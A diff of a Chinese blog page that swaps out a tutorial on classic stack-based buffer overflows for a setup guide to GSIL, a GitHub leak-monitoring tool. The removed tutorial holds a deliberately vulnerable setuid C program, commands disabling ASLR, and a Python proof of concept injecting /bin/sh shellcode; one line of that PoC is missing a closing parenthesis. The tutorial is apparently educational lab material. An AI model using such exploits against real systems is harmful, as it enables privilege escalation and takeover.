@@ -102,20 +102,25 @@
 
 
 
-  <meta name="description" content="缓冲区溢出缓冲区溢出有两种类型：  基于栈的缓冲区溢出 基于堆的缓冲区溢出  缓冲区溢出可导致任意代码执行！任意代码执行允许攻击者执行其代码以获取受害者机器的控制权，获取shell，添加新用户，打开端口等……">
-<meta name="keywords" content="pwn">
+  <meta name="description" content="0x01 GSIL介绍GSIL全称GitHub Sensitive Information Leakage（GitHub敏感信息泄露监控）。功能：  根据rules.gsil规则匹配GitHub内容 通过邮件告警 设置计划任务，定期扫描  GSIL项目主页：GSIL">
+<meta name="keywords" content="信息泄露,GitHub">
 <meta property="og:type" content="article">
-<meta property="og:title" content="PWN学习笔记2--堆栈的缓冲区溢出">
-<meta property="og:url" content="http://zeringzxh.github.io/2019/01/15/PWN学习笔记-堆栈的缓冲区溢出/index.html">
+<meta property="og:title" content="GSIL配置使用--GitHub敏感信息泄露监控">
+<meta property="og:url" content="http://zeringzxh.github.io/2019/01/22/GSIL配置使用-GitHub敏感信息泄露监控/index.html">
 <meta property="og:site_name" content="zering的博客">
-<meta property="og:description" content="缓冲区溢出缓冲区溢出有两种类型：  基于栈的缓冲区溢出 基于堆的缓冲区溢出  缓冲区溢出可导致任意代码执行！任意代码执行允许攻击者执行其代码以获取受害者机器的控制权，获取shell，添加新用户，打开端口等……">
+<meta property="og:description" content="0x01 GSIL介绍GSIL全称GitHub Sensitive Information Leakage（GitHub敏感信息泄露监控）。功能：  根据rules.gsil规则匹配GitHub内容 通过邮件告警 设置计划任务，定期扫描  GSIL项目主页：GSIL">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://zeringzxh.github.io/2019/01/15/PWN学习笔记-堆栈的缓冲区溢出/反编译.PNG">
-<meta property="og:updated_time" content="2019-01-15T07:59:48.876Z">
+<meta property="og:image" content="http://zeringzxh.github.io/2019/01/22/GSIL配置使用-GitHub敏感信息泄露监控/QQ邮箱服务器.PNG">
+<meta property="og:image" content="http://zeringzxh.github.io/2019/01/22/GSIL配置使用-GitHub敏感信息泄露监控/开启QQ邮箱SMTP服务.PNG">
+<meta property="og:image" content="http://zeringzxh.github.io/2019/01/22/GSIL配置使用-GitHub敏感信息泄露监控/密保验证.PNG">
+<meta property="og:image" content="http://zeringzxh.github.io/2019/01/22/GSIL配置使用-GitHub敏感信息泄露监控/token.PNG">
+<meta property="og:image" content="http://zeringzxh.github.io/2019/01/22/GSIL配置使用-GitHub敏感信息泄露监控/token信息.PNG">
+<meta property="og:image" content="http://zeringzxh.github.io/2019/01/22/GSIL配置使用-GitHub敏感信息泄露监控/gsil测试.PNG">
+<meta property="og:updated_time" content="2019-01-22T08:55:23.288Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="PWN学习笔记2--堆栈的缓冲区溢出">
-<meta name="twitter:description" content="缓冲区溢出缓冲区溢出有两种类型：  基于栈的缓冲区溢出 基于堆的缓冲区溢出  缓冲区溢出可导致任意代码执行！任意代码执行允许攻击者执行其代码以获取受害者机器的控制权，获取shell，添加新用户，打开端口等……">
-<meta name="twitter:image" content="http://zeringzxh.github.io/2019/01/15/PWN学习笔记-堆栈的缓冲区溢出/反编译.PNG">
+<meta name="twitter:title" content="GSIL配置使用--GitHub敏感信息泄露监控">
+<meta name="twitter:description" content="0x01 GSIL介绍GSIL全称GitHub Sensitive Information Leakage（GitHub敏感信息泄露监控）。功能：  根据rules.gsil规则匹配GitHub内容 通过邮件告警 设置计划任务，定期扫描  GSIL项目主页：GSIL">
+<meta name="twitter:image" content="http://zeringzxh.github.io/2019/01/22/GSIL配置使用-GitHub敏感信息泄露监控/QQ邮箱服务器.PNG">
 
 
 
@@ -124,7 +129,7 @@
 
 
 
-  <link rel="canonical" href="http://zeringzxh.github.io/2019/01/15/PWN学习笔记-堆栈的缓冲区溢出/">
+  <link rel="canonical" href="http://zeringzxh.github.io/2019/01/22/GSIL配置使用-GitHub敏感信息泄露监控/">
 
 
 
@@ -134,7 +139,7 @@
   };
 </script>
 
-  <title>PWN学习笔记2--堆栈的缓冲区溢出 | zering的博客</title>
+  <title>GSIL配置使用--GitHub敏感信息泄露监控 | zering的博客</title>
   
 
 
@@ -300,7 +305,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://zeringzxh.github.io/2019/01/15/PWN学习笔记-堆栈的缓冲区溢出/">
+    <link itemprop="mainEntityOfPage" href="http://zeringzxh.github.io/2019/01/22/GSIL配置使用-GitHub敏感信息泄露监控/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="zering">
@@ -317,7 +322,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">PWN学习笔记2--堆栈的缓冲区溢出
+          <h1 class="post-title" itemprop="name headline">GSIL配置使用--GitHub敏感信息泄露监控
               
             
           </h1>
@@ -342,7 +347,7 @@
                 
               
 
-              <time title="创建时间：2019-01-15 10:31:14 / 修改时间：15:59:48" itemprop="dateCreated datePublished" datetime="2019-01-15T10:31:14+08:00">2019-01-15</time>
+              <time title="创建时间：2019-01-22 15:06:30 / 修改时间：16:55:23" itemprop="dateCreated datePublished" datetime="2019-01-22T15:06:30+08:00">2019-01-22</time>
             
 
             
@@ -364,7 +369,7 @@
                 <span class="post-meta-item-text">分类于</span>
               
               
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/工具使用/" itemprop="url" rel="index"><span itemprop="name">工具使用</span></a></span>
 
                 
                 
@@ -379,8 +384,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2019/01/15/PWN学习笔记-堆栈的缓冲区溢出/#comments" itemprop="discussionUrl">
-                  <span class="post-meta-item-text">评论数：</span> <span class="post-comments-count valine-comment-count" data-xid="/2019/01/15/PWN学习笔记-堆栈的缓冲区溢出/" itemprop="commentCount"></span>
+                <a href="/2019/01/22/GSIL配置使用-GitHub敏感信息泄露监控/#comments" itemprop="discussionUrl">
+                  <span class="post-meta-item-text">评论数：</span> <span class="post-comments-count valine-comment-count" data-xid="/2019/01/22/GSIL配置使用-GitHub敏感信息泄露监控/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -408,25 +413,33 @@
       
 
       
-        <h1 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h1><p>缓冲区溢出有两种类型：</p>
-<ol>
-<li>基于栈的缓冲区溢出</li>
-<li>基于堆的缓冲区溢出</li>
-</ol>
-<p>缓冲区溢出可导致任意代码执行！<br>任意代码执行允许攻击者执行其代码以获取受害者机器的控制权，获取shell，添加新用户，打开端口等……<br><a id="more"></a></p>
-<h1 id="栈溢出示例"><a href="#栈溢出示例" class="headerlink" title="栈溢出示例"></a>栈溢出示例</h1><h2 id="易受攻击的代码"><a href="#易受攻击的代码" class="headerlink" title="易受攻击的代码"></a>易受攻击的代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//vuln.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">        <span class="comment">/* [1] */</span> <span class="keyword">char</span> buf[<span class="number">256</span>];</span><br><span class="line">        <span class="comment">/* [2] */</span> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="comment">/* [3] */</span> <span class="built_in">printf</span>(<span class="string">"Input:%s\n"</span>,buf);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>gcc编译<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#关闭ASLR（地址空间布局随机化）</span></span><br><span class="line">sudo <span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">gcc -g -fno-stack-protector -z execstack -o vuln vuln.c</span><br><span class="line"><span class="comment">#添加执行权限</span></span><br><span class="line">sudo chown root vuln</span><br><span class="line">sudo chgrp root vuln</span><br><span class="line">sudo chmod +s vuln</span><br></pre></td></tr></table></figure></p>
-<p>从上述代码可以看出，第[2]行代码存在缓冲区溢出，可导致任意代码执行。</p>
-<h2 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h2><p>使用gdb编译<br><img src="/2019/01/15/PWN学习笔记-堆栈的缓冲区溢出/反编译.PNG" alt=""></p>
-<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>当输入大小超过256时会溢出缓冲区并覆盖栈中的返回地址。通过输入“A” <em> 268 + “B” </em> 4测试。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ gdb -q vuln</span><br><span class="line">Reading symbols from /home/sploitfun/lsploits/new/csof/vuln...done.</span><br><span class="line">(gdb) r `python -c &apos;print &quot;A&quot;*268 + &quot;B&quot;*4&apos;`</span><br><span class="line">Starting program: /home/sploitfun/lsploits/new/csof/vuln `python -c &apos;print &quot;A&quot;*268 + &quot;B&quot;*4&apos;`</span><br><span class="line">Input:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x42424242 in ?? ()</span><br><span class="line">(gdb) p/x $eip</span><br><span class="line">$1 = 0x42424242</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>
-<p>输出显示寄存器eip被“BBBB”覆盖。</p>
+        <h1 id="0x01-GSIL介绍"><a href="#0x01-GSIL介绍" class="headerlink" title="0x01 GSIL介绍"></a>0x01 GSIL介绍</h1><p>GSIL全称GitHub Sensitive Information Leakage（GitHub敏感信息泄露监控）。<br>功能：</p>
 <ul>
-<li>0x8 is alignment space</li>
-<li>0x4 is caller’s EBP<br>268=256+8+4</li>
+<li>根据rules.gsil规则匹配GitHub内容</li>
+<li>通过邮件告警</li>
+<li>设置计划任务，定期扫描</li>
 </ul>
-<h2 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#exp.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> call</span><br><span class="line"></span><br><span class="line"><span class="comment">#Stack address where shellcode is copied.</span></span><br><span class="line">ret_addr = <span class="number">0xbffff1d0</span>       </span><br><span class="line"></span><br><span class="line"><span class="comment">#Spawn a shell</span></span><br><span class="line"><span class="comment">#execve(/bin/sh)</span></span><br><span class="line">scode = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#endianess convertion</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv</span><span class="params">(num)</span>:</span></span><br><span class="line"> <span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>,num</span><br><span class="line"></span><br><span class="line"><span class="comment"># buf = Junk + RA + NOP's + Shellcode</span></span><br><span class="line">buf = <span class="string">"A"</span> * <span class="number">268</span></span><br><span class="line">buf += conv(ret_addr)</span><br><span class="line">buf += <span class="string">"\x90"</span> * <span class="number">100</span></span><br><span class="line">buf += scode</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Calling vulnerable program"</span></span><br><span class="line">call([<span class="string">"./vuln"</span>, buf])</span><br></pre></td></tr></table></figure>
-<h1 id="英文原文"><a href="#英文原文" class="headerlink" title="英文原文"></a>英文原文</h1><p><a href="https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/" target="_blank" rel="noopener">Classic Stack Based Buffer Overflow</a></p>
+<p><strong>GSIL项目主页：</strong><br><a href="https://github.com/FeeiCN/GSIL" target="_blank" rel="noopener">GSIL</a><br><a id="more"></a></p>
+<h1 id="0x02-GSIL安装配置"><a href="#0x02-GSIL安装配置" class="headerlink" title="0x02 GSIL安装配置"></a>0x02 GSIL安装配置</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>使用python3进行安装,由于同时存在python2，因此使用python3，pip3来调用。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/FeeiCN/gsil.git</span><br><span class="line"><span class="built_in">cd</span> gsil/</span><br><span class="line">pip3 install -r requirements.txt</span><br></pre></td></tr></table></figure></p>
+<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>拷贝config.gsil.example为config.gsil，根据README-zh.md指导，配置参考如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[mail]</span><br><span class="line">host : smtp.exmail.qq.com</span><br><span class="line"># SMTP端口(非SSL端口，但会使用TLS加密)</span><br><span class="line">port : 25</span><br><span class="line"># 多个发件人使用逗号(,)分隔</span><br><span class="line">mails : gsil@feei.cn</span><br><span class="line">from : GSIL</span><br><span class="line">password : your_password</span><br><span class="line"># 多个收件人使用逗号(,)分隔</span><br><span class="line">to : feei@feei.cn</span><br><span class="line"></span><br><span class="line">[github]</span><br><span class="line"># 扫描到的漏洞仓库是否立刻Clone到本地（~/.gsil/codes/）</span><br><span class="line"># 此选项用作监控其它厂商，避免因为仓库所有者发现后被删除</span><br><span class="line">clone: false</span><br><span class="line"></span><br><span class="line"># GitHub Token用来调用相关API，多个Token使用逗号(,)分隔</span><br><span class="line"># https://github.com/settings/tokens</span><br><span class="line">tokens : your_token</span><br></pre></td></tr></table></figure></p>
+<ol>
+<li><p>mail设置部分<br>查看qq邮箱smtp服务器，如下：<br><img src="/2019/01/22/GSIL配置使用-GitHub敏感信息泄露监控/QQ邮箱服务器.PNG" alt=""></p>
+<p>修改host为smtp.qq.com,port为465。</p>
+<p>mails填写自己QQ邮箱，<em>注意</em>，此处password并非填写QQ邮箱密码，需要填写QQ邮箱授权码，<a href="https://service.mail.qq.com/cgi-bin/help?subtype=1&amp;&amp;id=28&amp;&amp;no=1001256" target="_blank" rel="noopener">授权码获取流程</a>：</p>
+<p>进入设置－》帐户页面找到如下页面：<br><img src="/2019/01/22/GSIL配置使用-GitHub敏感信息泄露监控/开启QQ邮箱SMTP服务.PNG" alt=""></p>
+<p>点击开启POP3/SMTP服务，进行密保验证：<br><img src="/2019/01/22/GSIL配置使用-GitHub敏感信息泄露监控/密保验证.PNG" alt=""></p>
+<p>获取授权码后填入password中。</p>
+<p>最后需要在“to : <a href="mailto:feei@feei.cn" target="_blank" rel="noopener">feei@feei.cn</a>”下一行添加“cc ：<a href="mailto:feei@feei.cn" target="_blank" rel="noopener">feei@feei.cn</a>”抄送邮箱，不然后面运行会报错。</p>
+</li>
+<li><p>GitHub设置部分<br>登录GitHub账号，设置tokens的页面说明文档已经给出：<br><a href="https://github.com/settings/tokens" target="_blank" rel="noopener">https://github.com/settings/tokens</a></p>
+<p>点击Generate new token，出现如下页面：<br><img src="/2019/01/22/GSIL配置使用-GitHub敏感信息泄露监控/token.PNG" alt=""></p>
+<p>填写token的描述，本人只勾选了repo下的public_repo。保存后出现如下信息：<br><img src="/2019/01/22/GSIL配置使用-GitHub敏感信息泄露监控/token信息.PNG" alt=""></p>
+<p>注意保存下token，token只显示一次，后续再登录无法重新获取。填入tokens中。配置结束。</p>
+</li>
+</ol>
+<h1 id="GSIL使用"><a href="#GSIL使用" class="headerlink" title="GSIL使用"></a>GSIL使用</h1><p>根据示例文件配置好rules.gsil规则，使用如下命令进行测试：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 gsil.py --verify-tokens</span><br></pre></td></tr></table></figure></p>
+<p>成功执行<br><img src="/2019/01/22/GSIL配置使用-GitHub敏感信息泄露监控/gsil测试.PNG" alt=""></p>
+<p>其他运行方式具体查看README-zh.md文档。</p>
 
       
     </div>
@@ -459,7 +472,7 @@
     <strong>本文作者： </strong>zering</li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="http://zeringzxh.github.io/2019/01/15/PWN学习笔记-堆栈的缓冲区溢出/" title="PWN学习笔记2--堆栈的缓冲区溢出">http://zeringzxh.github.io/2019/01/15/PWN学习笔记-堆栈的缓冲区溢出/</a>
+    <a href="http://zeringzxh.github.io/2019/01/22/GSIL配置使用-GitHub敏感信息泄露监控/" title="GSIL配置使用--GitHub敏感信息泄露监控">http://zeringzxh.github.io/2019/01/22/GSIL配置使用-GitHub敏感信息泄露监控/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！</li>
@@ -472,7 +485,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/pwn/" rel="tag"><i class="fa fa-tag"></i> pwn</a>
+            <a href="/tags/信息泄露/" rel="tag"><i class="fa fa-tag"></i> 信息泄露</a>
+          
+            <a href="/tags/GitHub/" rel="tag"><i class="fa fa-tag"></i> GitHub</a>
           
         </div>
       
@@ -485,8 +500,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/12/12/PWN学习笔记-入门/" rel="next" title="PWN学习笔记1--入门">
-                <i class="fa fa-chevron-left"></i> PWN学习笔记1--入门
+              <a href="/2019/01/15/PWN学习笔记-堆栈的缓冲区溢出/" rel="next" title="PWN学习笔记2--堆栈的缓冲区溢出">
+                <i class="fa fa-chevron-left"></i> PWN学习笔记2--堆栈的缓冲区溢出
               </a>
             
           </div>
@@ -494,10 +509,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/01/22/GSIL配置使用-GitHub敏感信息泄露监控/" rel="prev" title="GSIL配置使用--GitHub敏感信息泄露监控">
-                GSIL配置使用--GitHub敏感信息泄露监控 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -711,7 +722,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#缓冲区溢出"><span class="nav-number">1.</span> <span class="nav-text">缓冲区溢出</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#栈溢出示例"><span class="nav-number">2.</span> <span class="nav-text">栈溢出示例</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#易受攻击的代码"><span class="nav-number">2.1.</span> <span class="nav-text">易受攻击的代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#反编译"><span class="nav-number">2.2.</span> <span class="nav-text">反编译</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#测试"><span class="nav-number">2.3.</span> <span class="nav-text">测试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Poc"><span class="nav-number">2.4.</span> <span class="nav-text">Poc</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#英文原文"><span class="nav-number">3.</span> <span class="nav-text">英文原文</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-GSIL介绍"><span class="nav-number">1.</span> <span class="nav-text">0x01 GSIL介绍</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-GSIL安装配置"><span class="nav-number">2.</span> <span class="nav-text">0x02 GSIL安装配置</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#安装"><span class="nav-number">2.1.</span> <span class="nav-text">安装</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#配置"><span class="nav-number">2.2.</span> <span class="nav-text">配置</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#GSIL使用"><span class="nav-number">3.</span> <span class="nav-text">GSIL使用</span></a></li></ol></div>
             
 
           </div>
